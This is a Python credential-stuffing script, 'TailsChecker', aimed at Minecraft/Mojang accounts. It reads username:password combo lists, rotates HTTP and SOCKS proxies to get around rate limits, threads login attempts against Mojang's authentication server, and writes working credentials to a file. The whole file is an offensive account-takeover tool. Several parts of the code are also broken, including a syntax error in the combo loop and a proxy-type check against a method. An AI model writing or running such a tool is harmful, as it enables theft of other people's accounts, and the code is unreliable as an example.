from colorama import Fore, init, Style
from requests import Session, exceptions
from traceback import format_exc
from easygui import fileopenbox

import threading, requests
import ctypes, time, os
import random

class Colors:
    global white, yellow, red, green, cyan, blue, magenta

    yellow = Fore.LIGHTYELLOW_EX
    red = Fore.LIGHTRED_EX
    green = Fore.LIGHTGREEN_EX
    cyan = Fore.LIGHTCYAN_EX
    blue = Fore.LIGHTBLUE_EX
    white = Fore.LIGHTWHITE_EX
    magenta = Fore.LIGHTMAGENTA_EX
Colors()

version = "0.1.1"
mark = f'{red}\n' + requests.get("https://pastebin.com/raw/uxJtrC3n").text + f"\n\n{red}  TailsChecker-{version} »» Created by Tails Team\n"

class Main:
    def __init__(self):
        self.checking = True
        self.usernames = []
        self.passwords = []
        self.proxy_list = []
        self.invalid = 0
        self.counter = 0
        self.valid = 0
        self.hide = False
        self.protocol = None

    def proxy_type(self):
        self.protocol = int(input(f"{red} > {white} Please select your proxies protocol (HTTP = 1, SOCKS4 = 2, SOCKS5 = 3): "))
        if self.protocol < 1 or self.protocol > 3:
            print(f"{yellow} ERROR {white}: Incorrect value entered, retry.")
        

    def load_proxies(self):
        print(mark)
        if os.path.exists("proxies.txt"):
            try:
                with open("proxies.txt", 'r+', encoding='utf-8', errors='ignore') as e:
                    ext = e.readlines()
                    for line in ext:
                        try:
                            proxyline = line.split()[0].replace("\n", "")
                            self.proxy_list.append(proxyline)
                        except:
                            pass
                print(f"> Loaded [{len(self.proxy_list)}] proxies lines..\n")
            except Exception:
                print(f"\nproxy error")

        else:
            print(f"{yellow}ERROR {white}: No proxy file found, please select your proxies.")
            proxies = open(fileopenbox(title="Load Proxies List", default="*.txt"), "r", encoding="UTF-8", errors="ignore").readlines()
            for line in proxies:
                try:
                    proxyline = line.split()[0].replace("\n", "")
                    self.proxy_list.append(proxyline)
                except:
                    pass

            print(f"{red}> {white}Loaded [{len(self.proxy_list)}] proxies lines..\n")

    def load_combos(self):
        if os.path.exists("combo.txt"):
            with open("combo.txt", "r") as f:
                for line in f.read().splitlines():
                    if ":" in line:
                        self.usernames.append(line.split(":")[0])
                        self.passwords.append(line.split(":")[-1])
            if not len(self.usernames): return None
            return True
        
        else:
            print(mark)
            os.system("cls"); ctypes.windll.kernel32.SetConsoleTitleW("TC | Error"); 
            print(mark)
            print(f"> {yellow}ERROR{white} : No combo file found, please select your combo.")
            combo = open(fileopenbox(title="Load Combo List", default="*.txt"), "r", encoding="UTF-8", errors="ignore").read().splitlines()
            for line in combo:
                for ":" in line:
                    self.usernames.append(line.split(":")[0])
                    self.passwords.append(line.split(":")[-1])
            if not len(self.usernames): return None
            return True
    
    def title(self):
        ctypes.windll.kernel32.SetConsoleTitleW("TC | Valid: {} | Invalid: {} | Checked: {}/{} | Remaining: {}".format(self.valid, self.invalid, (self.valid + self.invalid), len(self.usernames), (len(self.usernames) - (self.valid + self.invalid))))
       
    def session(self):
        session = requests.Session()
        session.trust_env = False
        return session
    
    def check_account(self, username, password):
        try:
            session = self.session()
            proxy = random.choice(self.proxy_list)
            if self.proxy_type == 1:
                proxy_send = {"http": f"http://{proxy}", "https": f"https://{proxy}"}
            elif self.proxy_type == 2:
                proxy_send = {"http": f"socks4://{proxy}", "https": f"socks4://{proxy}"}
            elif self.proxy_type == 3:
                proxy_send = {"http": "socks5://" + proxy.split(":")[2] + ":" + proxy.split(":")[3] + "@" + proxy.split(":")[0] + ":1080", "https": "socks5://" + proxy.split(":")[2] + ":" + proxy.split(":")[3] + "@" + proxy.split(":")[0] + ":1080"}
                pxhidden = f'{proxy.split(":")[0]}:{proxy.split(":")[1]}:{red}**********{white}:{red}**********'
            json = {"agent": {"name": "Minecraft", "version": "1"}, "clientToken": None, "password": password, "requestUser": "true", "username": username}
            check = session.post("https://authserver.mojang.com/authenticate", json = json, headers = {"User-Agent": "MinecraftLauncher/1.0"}, proxies = proxy_send)

            if "accessToken" in check.json():
                if self.hide:
                    print(f'{green}[Good] {white}{username}:{red}********')
                else:
                    print(f'{green}[Good] {white}{username}:{password}')
            elif "error" in check.json():
                if self.hide:
                    print(f'{red}[Bad] {white}{username}:{red}********')
                else:
                    print(f'{red}[Bad] {white}{username}:{password}')
            elif "The request could not be satisfied." in check.content:
                print(f'{yellow}[Rate Limited] {white}the request could not be satisfied, removing proxy.')
                self.proxy_list.remove(proxy)
            
            if "clientToken" in check.text:
                with open("valid.txt", "a") as f: f.write("{}:{}\n".format(username, password))
                self.valid += 1
                self.title()
            else:
                self.invalid += 1
                self.title()
        except Exception as err:
            if "No connection could be made because the target machine actively refused it" in str(err):
                self.proxy_list.remove(proxy)
                # print(f'{yellow}[Invalid Proxy] removing {white}=> {proxy}')
                if self.hide:
                    print(f'{yellow}[Invalid Proxy] removing {white}=> {pxhidden}')
                else:
                    print(f'{yellow}[Invalid Proxy] removing {white}=> {proxy}')

    def start_checking(self):
        def thread_starter():
            self.check_account(self.usernames[self.counter], self.passwords[self.counter])

        while True:
            if threading.active_count() <= self.threads:
                threading.Thread(target = thread_starter).start()
                self.counter += 1
            
            if self.counter >= len(self.usernames): break
        input()

    def start(self):
        os.system("cls")
        self.proxy_type()
        self.load_proxies()
        self.start_checking()

    def main(self):
        os.system("cls")
        load_combo = self.load_combos()
        if load_combo is not None:
            print(mark)
            self.threads = int(input(f"{red}> {white}Threads: "))
            os.system("cls")
            print(mark)
            try:
                passwords = int(input(f"{red}> {white}Hide passwords (default: 0 = no, 1 = yes): "))
                if passwords == 1:
                    self.hide = True
                else:
                    self.hide = False
            except Exception:
                passwords = 0

            os.system("cls")
            print(mark)
            try:
                self.retries = int(input(f"{red}> {white}Retries (default: 0, 3 max): "))
                if self.retries == 0:
                    self.retries = 1
                elif self.retries > 3 or self.retries < 1:
                    retries_old = self.retries
                    self.retries = 1
                    print(f"{red}Unexpected value ({retries_old}, new value {self.retries}")
                    self.start()
            except Exception:
                self.retries = 1
                self.start()
        else:
            os.system("cls"); ctypes.windll.kernel32.SetConsoleTitleW("TC | Error"); 
            print(f"\n{yellow}ERROR{white} : Combos could not be loaded."); time.sleep(10); 
            exit()

Main().main()
